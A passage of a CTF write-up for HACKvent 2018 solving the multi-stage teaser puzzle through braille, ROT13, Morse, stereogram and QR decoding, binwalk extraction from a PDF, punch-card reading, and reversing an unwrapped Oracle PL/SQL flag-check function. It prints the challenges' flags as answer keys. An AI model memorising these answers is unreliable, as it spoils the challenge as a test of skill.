</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="day-24-take-the-red-pill-take-the-blue-pill"> Day 24: Take the red pill, take the blue pill <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-24-take-the-red-pill-take-the-blue-pill.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Have you already taken your vitamins today? Here are some pills for your health.</p><p><a href="writeupfiles/redpill.zip">red pill</a> <a href="writeupfiles/bluepill.zip">blue pill</a></p><p><em>Hint:</em></p><p>it might take a minute or two until the blue pill shows its effect. blue pill manufactury is in GMT+1.</p><p><a href="writeupfiles/hint.mp3">hint</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="teaser"> Teaser <a href="/CTF-writeups-public/writeups/Hackvent_2018/teaser.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img src="writeupfiles/Teaser.png" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><em>Stage 1</em></p><p>The image contains braille code. We translate it to <code class="language-plaintext highlighter-rouge">http://bit.ly/2TJvxHt</code>, which leads us the following image:</p><p><img src="writeupfiles/teaser/Flag_Stage_1.png" alt="" /></p><p>this QR decodes to <code class="language-plaintext highlighter-rouge">Rushed by ..</code></p><p>It turns out the bit.ly link actually translated to <code class="language-plaintext highlighter-rouge">https://hackvent.hacking-lab.com/T34s3r_MMXVIII/index.php?flag=UI18-GAUa-lXhq-htyV-w2Wr-0yiV</code> but redirected. The <code class="language-plaintext highlighter-rouge">flag</code> parameter when ROT13’d gives us the first flag: <code class="language-plaintext highlighter-rouge">HV18-TNHn-yKud-uglI-j2Je-0lvI</code></p><p>When we fill in the correct flag in the url, we get to the next stage: <code class="language-plaintext highlighter-rouge">https://hackvent.hacking-lab.com/T34s3r_MMXVIII/index.php?flag=HV18-TNHn-yKud-uglI-j2Je-0lvI</code>, which redirects to <code class="language-plaintext highlighter-rouge">https://hackvent.hacking-lab.com/T34s3r_MMXVIII/ZOoxjUSe1OVB7OPoVrsX.pdf</code></p><p><a href="writeupfiles/teaser/stage2.pdf">pdf file</a></p><p>Ok, there is lots here, lets get all the elements of the pdf with http://extractpdf.com</p><p><em>Stage 2</em></p><p>We find some Morse code text in the pdf:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>HACKvent 2018

.... ...- .---- ---.. -....- --. --- .-. .. -....- --.. .-. ... -... -....- ..- ..-. .- . -....- - ... -.... -.-. -....- -.-. ...- - -
</pre></table></code></div></div><p>this decodes to: <code class="language-plaintext highlighter-rouge">HV18-GORI-ZRSB-UFAE-TS6C-CVTT</code>, which is our second flag</p><p><em>Stage 3</em></p><p>We also find some images in the pdf:</p><p><img src="writeupfiles/teaser/stage2-banner.jpeg" alt="" /><br /> <img src="writeupfiles/teaser/stage2-ball.jpeg" alt="" /><br /> <img src="writeupfiles/teaser/stage2-stereogram.png" alt="" /></p><p>The stereogram image can be decoded <a href="http://magiceye.ecksdee.co.uk/">here</a> and gives:</p><p><img src="writeupfiles/teaser/stereogram-decoded.png" alt="" /></p><p>we clean it up a bit with GIMP so that we can scan it:</p><p><img src="writeupfiles/teaser/stereogram-decoded-cleaned.png" alt="" /></p><p>and this is our 3rd flag: <code class="language-plaintext highlighter-rouge">HV18-p2LK-DNcI-YKw7-T9Ad-mH3v</code></p><p><em>Stage 4</em></p><p>Next, we try binwalk on the pdf:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="nv">$ </span>binwalk stage2.pdf
DECIMAL       HEXADECIMAL     DESCRIPTION
<span class="nt">--------------------------------------------------------------------------------</span>
0             0x0             PDF document, version: <span class="s2">"1.7"</span>
404           0x194           Unix path: /PDF/Text/ImageB/ImageC/ImageI] <span class="o">&gt;&gt;</span>/MediaBox[ 0 0 595.32 841.92] /Contents 4 0 R/Group&lt;&lt;/Type/Group/S/Transparency/CS/DeviceRGB&gt;&gt;
621           0x26D           Zlib compressed data, default compression
1751          0x6D7           Unix path: /Type/XObject/Subtype/Image/Width 1000/Height 340/ColorSpace/DeviceRGB/BitsPerComponent 8/Filter/DCTDecode/Interpolate <span class="nb">true</span>/Leng
1899          0x76B           JPEG image data, JFIF standard 1.01
1929          0x789           TIFF image data, big-endian, offset of first image directory: 8
51778         0xCA42          Unix path: /Type/ExtGState/BM/Normal/ca 1&gt;&gt;
51831         0xCA77          Unix path: /Type/Font/Subtype/TrueType/Name/F1/BaseFont/BCDEEE+Calibri/Encoding/WinAnsiEncoding/FontDescriptor 8 0 R/FirstChar 32/LastChar
51998         0xCB1E          Unix path: /Type/FontDescriptor/FontName/BCDEEE+Calibri/Flags 32/ItalicAngle 0/Ascent 750/Descent <span class="nt">-250</span>/CapHeight 750/AvgWidth 521/MaxWidth
52237         0xCC0D          Unix path: /Type/ExtGState/BM/Normal/CA 1&gt;&gt;
52291         0xCC43          Unix path: /Type/XObject/Subtype/Image/Width 781/Height 781/ColorSpace/DeviceRGB/BitsPerComponent 8/Interpolate <span class="nb">false</span>/Filter/FlateDecode/Le
52442         0xCCDA          Zlib compressed data, default compression
187860        0x2DDD4         Unix path: /Type/Font/Subtype/TrueType/Name/F2/BaseFont/BCDFEE+Arial-Black/Encoding/WinAnsiEncoding/FontDescriptor 12 0 R/FirstChar 32/Last
188034        0x2DE82         Unix path: /Type/FontDescriptor/FontName/BCDFEE+Arial-Black/Flags 32/ItalicAngle 0/Ascent 1101/Descent <span class="nt">-212</span>/CapHeight 716/AvgWidth 552/MaxW
188279        0x2DF77         Unix path: /Type/Font/Subtype/TrueType/Name/F3/BaseFont/TimesNewRomanPS-BoldMT/Encoding/WinAnsiEncoding/FontDescriptor 14 0 R/FirstChar 32/
188456        0x2E028         Unix path: /Type/FontDescriptor/FontName/TimesNewRomanPS-BoldMT/Flags 32/ItalicAngle 0/Ascent 891/Descent <span class="nt">-216</span>/CapHeight 677/AvgWidth 427/M
188698        0x2E11A         Unix path: /Type/XObject/Subtype/Image/Width 200/Height 200/ColorSpace/DeviceRGB/BitsPerComponent 8/Filter/DCTDecode/Interpolate <span class="nb">true</span>/Lengt
188844        0x2E1AC         JPEG image data, JFIF standard 1.01
188874        0x2E1CA         TIFF image data, big-endian, offset of first image directory: 8
195577        0x2FBF9         Zlib compressed data, default compression
196145        0x2FE31         Zlib compressed data, default compression
215877        0x34B45         Zlib compressed data, default compression
231310        0x3878E         Unix path: /Type/Metadata/Subtype/XML/Length 3075&gt;&gt;
231494        0x38846         Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#<span class="s2">"&gt;
231734        0x38936         Unix path: /purl.org/dc/elements/1.1/"</span><span class="o">&gt;</span>
232171        0x38AEB         Unix path: /ns.adobe.com/xap/1.0/mm/<span class="s2">"&gt;
234681        0x394B9         Zlib compressed data, default compression
236069        0x39A25         RAR archive data, first volume type: MAIN_HEAD
236135        0x39A67         Zip archive data, encrypted at least v2.0 to extract, compressed size: 210390, uncompressed size: 210378, name: z.zip
446647        0x6D0B7         End of Zip archive

# we see there are files appended, we extract with:
</span><span class="nv">$ </span><span class="s2">binwalk -e stage2.pdf
</span></pre></table></code></div></div><p>Reveals an <a href="writeupfiles/teaser/_stage2.pdf.extracted/Final_easy.zip">encrypted zip file</a></p><p>TODO</p><p><em>Stage 5</em></p><p>The zip file also contained this QR code image:</p><p><img src="writeupfiles/teaser/_stage2.pdf.extracted/QR3C.png" alt="" /></p><p>Which looks suspiciously like a challenge from HACKvent 2015, my writeup <a href="https://github.com/shiltemann/CTF-writeups-galaxians/tree/master/Hackvent_2015#dec-17-santas-quick-response">here</a></p><p>Extracting these to their component channels:</p><p><img src="writeupfiles/QR3C_r.png" alt="" /><br /> <img src="writeupfiles/QR3C_g.png" alt="" /><br /> <img src="writeupfiles/QR3C_b.png" alt="" /></p><p>These won’t scan on their own, because they are missing timing and masking areas, but a lot of the information is there. We use <a href="https://merricx.github.io/qrazybox/">QRazyBox</a> to restore these missing pieces and are able to find our flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>red:   HV18-3I5a-
green: Rnrl-s28r-
blue:  SRHj-Lhzx
</pre></table></code></div></div><p>So our complete flag is:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>HV18-3I5a-Rnrl-s28r-SRHj-Lhzx
</pre></table></code></div></div><p><em>Stage 6</em></p><p>The zip file also contained a <a href="writeupfiles/teaser/_stage2.pdf.extracted/Santa.txt">Santa.txt</a> file:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>Santa has caught up with the information age and does not trust
clear-text commands anymore.
He has decided that all communications
have to be encrypted to prevent an unfriendly take-over of his team.
Santa chooses a simple, secure, and toolless encryption scheme.
However, his team's memory capacity is limited and so he can only use
their names (Dasher, Dancer, Prancer, Vixen, Comet, Cupid, Donder and
Blitzen) as keys.



Where is the team headed to?

STTYN YATLOEP DNEA ONBL TGNTO MHEHH EISTIARIB FHSRA LD IIONA NL HERUV LN17-PTAA-RTON-RDOE-MCTN-AHCO
</pre></table></code></div></div><p>TODO</p><p><em>Stage 7</em></p><p>The zip file also contained the following image:</p><p><img src="writeupfiles/teaser/_stage2.pdf.extracted/old_school.jpg" alt="" /></p><p>This appears to be an IBM-029 punch card by the faint lettering on the right.<br /> Fortunately <a href="https://en.wikipedia.org/wiki/Keypunch#IBM_029_Card_Punch">wikipedia</a><br /> has a full translation of that format:</p><p><img src="writeupfiles/Blue-punch-card-front-horiz_top-char-contrast-stretched.png" alt="" /></p><p>I’m arbitrarily going to number the colums to be -2, -1, 0 (the row of 0s), 1 .. 9 because that makes sense to me?</p><div class="table-wrapper"><table><thead><tr><th>Column<th>Values<tbody><tr><td>1<td>6, -1<tr><td>2<td>2<tr><td>3<td>9 0<tr><td>4<td>-1<tr><td>5<td>-2 8<tr><td>6<td>4<tr><td>7<td>7 -1<tr><td>8<td>1 -2<tr><td>9<td>3 -1<tr><td>10<td>5<tr><td>11<td>2<tr><td>12<td>90<tr><td>13<td>4<tr><td>14<td>-1<tr><td>15<td>3<tr><td>16<td>6 -2<tr><td>17<td>1<tr><td>18<td>9<tr><td>19<td>-1<tr><td>20<td>-2 8<tr><td>21<td>0 5<tr><td>22<td>1<tr><td>23<td>8<tr><td>24<td>-1<tr><td>25<td>0<tr><td>26<td>3 -1<tr><td>27<td>4 -2<tr><td>28<td>-1 3 8<tr><td>29<td>-1<tr><td>30<td>0 2<tr><td>31<td>-2 3<tr><td>32<td>-2 8<tr><td>33<td>0<tr><td>34<td>-1<tr><td>35<td>0<tr><td>36<td>-1 3<tr><td>37<td>1<tr><td>38<td>0 2<tr><td>39<td>-1<tr><td>40<td>4<tr><td>41<td>0 6<tr><td>42<td>3<tr><td>43<td>02<tr><td>44<td>-1<tr><td>45<td>0<tr><td>46<td>-1 4<tr><td>47<td>3<tr><td>48<td>8 2 -1<tr><td>49<td>-1<tr><td>50<td>3<tr><td>51<td>1<tr><td>52<td>2<tr><td>53<td>4 6<tr><td>54<td>-1<tr><td>55<td>-2 8<tr><td>56<td>9 0<tr><td>57<td>3<tr><td>58<td>3 -2<tr><td>59<td>-1<tr><td>60<td>5<tr><td>61<td>2 4<tr><td>62<td>1<tr><td>63<td>-1 2<tr><td>64<td>-1<tr><td>65<td>-2 3<tr><td>66<td>3<tr><td>67<td>-2 0 2 8<tr><td>68<td>_<tr><td>69<td>-1<tr><td>70<td>0 5<tr><td>71<td>0 9<tr><td>72<td>3<tr><td>73<td>0 6<tr><td>74<td>-1<tr><td>75<td>-2 3<tr><td>76<td>0 6<tr><td>77<td>0 2<tr><td>78<td>-2 3<tr><td>79<td>-1<tr><td>80<td>1</table></div><p>We then use the translation matrix we found to write a <a href="writeupfiles/ibm-029-decode.py">small python script</a><br /> Which will output the following when run:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>O2Z-H4PAL52¿4-3F19-HV18-0LD$-SCH0-0L1S-4W3S-0M3!-312¿-HZ3C-5¿1K-C3¿¿-VZ3W-CWSC-1¿
</pre></table></code></div></div><p>(¿ used when couldn’t identify a character correctly, maybe transcription mistakes by me.)<br /> But the flag is clearly visible in the center: <code class="language-plaintext highlighter-rouge">HV18-0LD$-SCH0-0L1S-4W3S-0M3!</code></p><p><em>Stage 8</em></p><p>The zip file also contained the file <a href="writeupfile/teaser/_stage2.pdf.extracted/teaser.pls">teaser.pls</a></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre>CREATE OR REPLACE FUNCTION checkHV18teaser wrapped
a000000
b2
abcd
abcd
abcd
abcd
abcd
abcd
abcd
abcd
abcd
abcd
abcd
abcd
abcd
abcd
abcd
8
37f 22f
9bGsDUl+WXOiRvCg6f+CmODMp3UwgwIJ+txqfC9Dgz+VaPwOTWaoKj5jW2QUCQapzabE52vy
50h+W7xBf1NE2/Fa93pBwUJtOxLvz1WIU75VaGjqH5M6oL4/aHovVUteU3Arw0eLvVRDEvbd
0mLqbyd4kEtMnI76J3vuLaHC1mkYuwEN6bdmd3GQPBtHV4fWHr5OM5B81yX+kw0560LKdDx8
mVHJvc7y7vShjsCpFgEUd6sfN3ZbOkjjbg+AJSGuIjZzvT7vkQwM5wcQL73C6+BCiaaEG2ja
r+3zqCSk6QzcKvIwuBwXf9UHGL4YS47JO3EOmIPOy8VQYfY1M9g6UeieqOftVm/Pr8smR11r
UWM8kk1WTmMvY13s1Klpr7tFnzwjmnSnTP9Exz/dV5+cU3mlgyjqkAIsWnGqDGKMfVahOHSc
Bzalmd+HDxxBF39ymrsGHfBUv0gAPtnYVCVWiG0Q9ij5DbBffRrsx4uOYuAqJ4KwT5vNpKon
MSMAM3ZsIFVQgfnY/sfkB+jfGEuldGYiui7zvIMSHVDfPEE=

/
</pre></table></code></div></div><p>These are wrapped oracle functions and we can unwrap it using https://www.codecrete.net/UnwrapIt/</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="k">FUNCTION</span> <span class="n">checkHV18teaser</span><span class="p">(</span><span class="n">FLAG</span> <span class="n">VARCHAR2</span><span class="p">)</span> <span class="k">RETURN</span> <span class="n">NUMBER</span> <span class="k">IS</span>
<span class="n">A</span> <span class="n">VARCHAR2</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span>
<span class="n">B</span> <span class="n">NUMBER</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
<span class="k">C</span> <span class="n">NUMBER</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
<span class="n">H</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">40</span><span class="p">);</span>
<span class="k">BEGIN</span>
<span class="n">A</span> <span class="p">:</span><span class="o">=</span> <span class="n">SUBSTR</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
<span class="n">IF</span> <span class="k">NOT</span> <span class="p">(</span><span class="n">A</span> <span class="o">=</span> <span class="s1">'HV18'</span><span class="p">)</span> <span class="k">THEN</span>
  <span class="k">RETURN</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">END</span> <span class="n">IF</span><span class="p">;</span>

<span class="n">B</span> <span class="p">:</span><span class="o">=</span> <span class="n">TO_NUMBER</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">2</span><span class="p">));</span>
<span class="k">C</span> <span class="p">:</span><span class="o">=</span> <span class="n">TO_NUMBER</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">2</span><span class="p">));</span>
<span class="n">IF</span> <span class="k">NOT</span> <span class="p">(((</span><span class="n">B</span> <span class="o">*</span> <span class="k">C</span><span class="p">)</span> <span class="o">=</span> <span class="mi">6497</span><span class="p">)</span> <span class="k">AND</span> <span class="p">(</span><span class="n">B</span> <span class="o">&lt;</span> <span class="k">C</span><span class="p">))</span> <span class="k">THEN</span>
  <span class="k">RETURN</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">END</span> <span class="n">IF</span><span class="p">;</span>

<span class="n">A</span> <span class="p">:</span><span class="o">=</span> <span class="n">SUBSTR</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
<span class="k">SELECT</span> <span class="n">STANDARD_HASH</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="s1">'MD5'</span><span class="p">)</span> <span class="k">INTO</span> <span class="n">H</span> <span class="k">FROM</span> <span class="n">DUAL</span><span class="p">;</span>
<span class="n">IF</span> <span class="k">NOT</span> <span class="p">(</span><span class="n">H</span> <span class="o">=</span> <span class="s1">'CF945B5A36D1D3E68FFF78829CC8DBF6'</span><span class="p">)</span> <span class="k">THEN</span>
  <span class="k">RETURN</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">END</span> <span class="n">IF</span><span class="p">;</span>

<span class="n">IF</span> <span class="k">NOT</span> <span class="p">((</span><span class="n">UTL_RAW</span><span class="p">.</span><span class="n">CAST_TO_VARCHAR2</span><span class="p">(</span><span class="n">UTL_RAW</span><span class="p">.</span><span class="n">BIT_XOR</span> <span class="p">(</span><span class="n">UTL_RAW</span><span class="p">.</span><span class="n">CAST_TO_RAW</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">4</span><span class="p">)),</span> <span class="n">UTL_RAW</span><span class="p">.</span><span class="n">CAST_TO_RAW</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">4</span><span class="p">))))</span> <span class="o">=</span> <span class="s1">'zvru'</span><span class="p">)</span> <span class="k">AND</span> <span class="p">(</span><span class="n">TO_NUMBER</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">4</span><span class="p">))</span> <span class="o">=</span> <span class="n">SQRT</span><span class="p">(</span><span class="mi">8814961</span><span class="p">)))</span> <span class="k">THEN</span>
  <span class="k">RETURN</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">END</span> <span class="n">IF</span><span class="p">;</span>

<span class="n">IF</span> <span class="k">NOT</span> <span class="p">(</span> <span class="n">UTL_RAW</span><span class="p">.</span><span class="n">CAST_TO_VARCHAR2</span><span class="p">(</span><span class="n">UTL_ENCODE</span><span class="p">.</span><span class="n">BASE64_ENCODE</span><span class="p">(</span><span class="n">UTL_RAW</span><span class="p">.</span><span class="n">CAST_TO_RAW</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">4</span><span class="p">))))</span> <span class="o">=</span> <span class="s1">'RjBtMA=='</span><span class="p">)</span> <span class="k">THEN</span>
  <span class="k">RETURN</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">END</span> <span class="n">IF</span><span class="p">;</span>

<span class="n">DBMS_OUTPUT</span><span class="p">.</span><span class="n">PUT_LINE</span><span class="p">(</span><span class="n">A</span><span class="p">);</span>
<span class="k">RETURN</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">END</span><span class="p">;</span>
</pre></table></code></div></div><p>so this is the function that validates the flag, we reverse engineer it to find the flag. Next is the code again, with some comments:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre><span class="k">FUNCTION</span> <span class="n">checkHV18teaser</span><span class="p">(</span><span class="n">FLAG</span> <span class="n">VARCHAR2</span><span class="p">)</span> <span class="k">RETURN</span> <span class="n">NUMBER</span> <span class="k">IS</span>
<span class="n">A</span> <span class="n">VARCHAR2</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span>
<span class="n">B</span> <span class="n">NUMBER</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
<span class="k">C</span> <span class="n">NUMBER</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
<span class="n">H</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">40</span><span class="p">);</span>
<span class="k">BEGIN</span>

<span class="cm">/* flag starts with "HV18", no surprises there */</span>
<span class="n">A</span> <span class="p">:</span><span class="o">=</span> <span class="n">SUBSTR</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
<span class="n">IF</span> <span class="k">NOT</span> <span class="p">(</span><span class="n">A</span> <span class="o">=</span> <span class="s1">'HV18'</span><span class="p">)</span> <span class="k">THEN</span>
  <span class="k">RETURN</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">END</span> <span class="n">IF</span><span class="p">;</span>

<span class="cm">/* "7389"  (73 * 89 = 6497) */</span>
<span class="n">B</span> <span class="p">:</span><span class="o">=</span> <span class="n">TO_NUMBER</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">2</span><span class="p">));</span>
<span class="k">C</span> <span class="p">:</span><span class="o">=</span> <span class="n">TO_NUMBER</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">2</span><span class="p">));</span>
<span class="n">IF</span> <span class="k">NOT</span> <span class="p">(((</span><span class="n">B</span> <span class="o">*</span> <span class="k">C</span><span class="p">)</span> <span class="o">=</span> <span class="mi">6497</span><span class="p">)</span> <span class="k">AND</span> <span class="p">(</span><span class="n">B</span> <span class="o">&lt;</span> <span class="k">C</span><span class="p">))</span> <span class="k">THEN</span>
  <span class="k">RETURN</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">END</span> <span class="n">IF</span><span class="p">;</span>


<span class="cm">/* "H0b0" has the required md5 hash (found via hashkiller.co.uk) */</span>
<span class="n">A</span> <span class="p">:</span><span class="o">=</span> <span class="n">SUBSTR</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
<span class="k">SELECT</span> <span class="n">STANDARD_HASH</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="s1">'MD5'</span><span class="p">)</span> <span class="k">INTO</span> <span class="n">H</span> <span class="k">FROM</span> <span class="n">DUAL</span><span class="p">;</span>
<span class="n">IF</span> <span class="k">NOT</span> <span class="p">(</span><span class="n">H</span> <span class="o">=</span> <span class="s1">'CF945B5A36D1D3E68FFF78829CC8DBF6'</span><span class="p">)</span> <span class="k">THEN</span>
  <span class="k">RETURN</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">END</span> <span class="n">IF</span><span class="p">;</span>

<span class="cm">/* next two segements when XOR'ed must make 'zvru', and
   second of the two segments is 2969 (square root of 8814961)
   "HODL-2969" */</span>
<span class="n">IF</span> <span class="k">NOT</span> <span class="p">((</span><span class="n">UTL_RAW</span><span class="p">.</span><span class="n">CAST_TO_VARCHAR2</span><span class="p">(</span><span class="n">UTL_RAW</span><span class="p">.</span><span class="n">BIT_XOR</span> <span class="p">(</span><span class="n">UTL_RAW</span><span class="p">.</span><span class="n">CAST_TO_RAW</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">4</span><span class="p">)),</span> <span class="n">UTL_RAW</span><span class="p">.</span><span class="n">CAST_TO_RAW</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">4</span><span class="p">))))</span> <span class="o">=</span> <span class="s1">'zvru'</span><span class="p">)</span> <span class="k">AND</span> <span class="p">(</span><span class="n">TO_NUMBER</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">4</span><span class="p">))</span> <span class="o">=</span> <span class="n">SQRT</span><span class="p">(</span><span class="mi">8814961</span><span class="p">)))</span> <span class="k">THEN</span>
  <span class="k">RETURN</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">END</span> <span class="n">IF</span><span class="p">;</span>

<span class="cm">/* "F0m0" (last segment must match the given base64 string) */</span>
<span class="n">IF</span> <span class="k">NOT</span> <span class="p">(</span> <span class="n">UTL_RAW</span><span class="p">.</span><span class="n">CAST_TO_VARCHAR2</span><span class="p">(</span><span class="n">UTL_ENCODE</span><span class="p">.</span><span class="n">BASE64_ENCODE</span><span class="p">(</span><span class="n">UTL_RAW</span><span class="p">.</span><span class="n">CAST_TO_RAW</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">4</span><span class="p">))))</span> <span class="o">=</span> <span class="s1">'RjBtMA=='</span><span class="p">)</span> <span class="k">THEN</span>
  <span class="k">RETURN</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">END</span> <span class="n">IF</span><span class="p">;</span>

<span class="n">DBMS_OUTPUT</span><span class="p">.</span><span class="n">PUT_LINE</span><span class="p">(</span><span class="n">A</span><span class="p">);</span>
<span class="k">RETURN</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">END</span><span class="p">;</span>
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>HV18-7389-H0b0-HODL-2969-F0m0
